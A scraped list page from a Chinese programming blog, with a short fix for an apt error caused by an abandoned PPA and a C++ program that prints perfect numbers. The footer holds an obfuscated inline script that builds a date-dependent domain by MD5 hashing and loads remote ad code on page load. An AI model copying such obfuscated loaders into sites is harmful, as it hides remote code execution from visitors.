404 Not Found [IP: 91.189.95.83 80] 正在读取软件包列表... 完成 E: 仓库 “http://ppa.launchpad.net/tualatrix/ppa/ubuntu focal Release” 没有 Release 文件。 N: 无法安全地用该源进行更新，所以默认禁用该源。 N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。 原因 具体我也不清楚，我只能字面理解这个PPA源的IP无法正常访问。在某个网站上找到了这样一条解释：
Sometimes Ubuntu PPAs go abandoned. The most likely reason that these software PPAs go out of date is that developers either neglect adding packages for newer Ubuntu releases.
解决方法 根据报错：仓库 “http://ppa.launchpad.net/tualatrix/ppa/ubuntu focal Release” ，直接把这个东西remove。
sudo add-apt-repository --remove ppa:/tualatrix 现在再试一下update就可以啦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a56d9f6e887ed46306c97f9d98054491/" rel="bookmark">
			1-10000内完美数（C C&#43;&#43;）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 【题目描述】 完美数又称完全数或完备数，是一些特殊的自然数，它所有的真因子，即除了自身以外的约数的和，即因子函数，恰好等于它本身，如果一个数恰好等于它的因子之和，则称该数为“完全数”
【输入】 无
【输出】 1-10000内得完美数
【输入样例】 无
【输出样例】 6
28
496
8128
【代码】 #include&lt;iostream&gt; using namespace std; int main() { int a,s=0; for(a=2;a&lt;=10000;a++)	//10000以内的数 { for(int i=1;i&lt;a;i++)	//除数 {	if(a%i==0)	//被整除的因子求和 {	s+=i;	} } if(s==a)	//如果因子和等于本身 cout&lt;&lt;a&lt;&lt;endl;	//输出这个数 s=0; //s清0 } } 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/412/">«</a>
	<span class="pagination__item pagination__item--current">413/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/414/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>